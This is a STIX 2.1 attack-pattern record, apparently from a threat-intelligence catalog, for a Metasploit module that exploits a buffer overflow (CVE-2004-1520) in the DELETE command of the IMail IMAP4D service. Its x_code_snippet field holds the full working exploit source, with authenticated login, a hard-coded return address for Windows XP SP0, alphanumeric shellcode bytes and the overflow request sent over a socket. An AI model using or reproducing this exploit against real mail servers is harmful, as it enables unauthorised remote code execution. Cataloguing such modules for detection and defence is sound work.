{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f20d4bd-2593-443c-9879-96dfce71b8c4",
    "created": "2024-08-14T16:47:42.701092Z",
    "modified": "2024-08-14T16:47:42.701096Z",
    "name": "IMail IMAP4D Delete Overflow",
    "description": " This module exploits a buffer overflow in the 'DELETE' command of the IMail IMAP4D service. This vulnerability can only be exploited with a valid username and password. This flaw was patched in version 8.14. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/imail_delete.rb",
            "external_id": "imail_delete.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1520"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Imap\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IMail IMAP4D Delete Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the 'DELETE'\n        command of the IMail IMAP4D service. This vulnerability\n        can only be exploited with a valid username and password.\n        This flaw was patched in version 8.14.\n      },\n      'Author'         => [ 'spoonm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1520'],\n          [ 'OSVDB', '11838'],\n          [ 'BID', '11675'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'  => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 614,\n          'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),\n          'StackAdjustment' => -3500,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EDX',\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # alphanum rets :(, will look more into it later\n          ['Windows XP sp0 comctl32.dll', { 'Ret' => 0x77364650 }],\n        ],\n      'DisclosureDate' => '2004-11-12',\n      'DefaultTarget' => 0))\n  end\n\n  def exploit\n    connect_login\n\n    print_status(\"Sending overflow string...\")\n    req = 'A683 DELETE '\n    req << payload.encoded\n\n    # Jump over code\n    req << \"\\x74\\x32\\x75\\x30\"\n    req << [target.ret].pack('V')\n    req << rand_text_alphanumeric(44)\n\n    # GetEIP code\n    req << \"\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x4c\\x5a\\x6a\\x31\\x59\"\n    req << \"\\x6b\\x42\\x34\\x49\\x30\\x42\\x4e\\x42\\x49\\x75\\x50\\x4a\\x4a\\x52\\x52\\x59\"\n\n    # Alphanumeric jmp back (edx context)\n    req << \"\\x6a\\x6a\\x58\\x30\\x42\\x31\\x50\\x41\\x42\\x6b\\x42\\x41\"\n    req << \"\\x7a\\x42\\x32\\x42\\x41\\x32\\x41\\x41\\x30\\x41\\x41\\x58\\x38\\x42\\x42\\x50\"\n    req << \"\\x75\\x4a\\x49\\x52\\x7a\\x71\\x4a\\x4d\\x51\\x7a\\x4a\\x6c\\x55\\x66\\x62\\x57\"\n    req << \"\\x70\\x55\\x50\\x4b\\x4f\\x6b\\x52\\x6a\"\n\n    # Run off the stack, so we don't kill our payload, or something...\n    req << rand_text_alphanumeric(600)\n\n    # Terminate the request\n    req << \"\\r\\n\"\n\n    sock.put(req)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-12",
    "x_mitre_platforms": [
        "win'"
    ]
}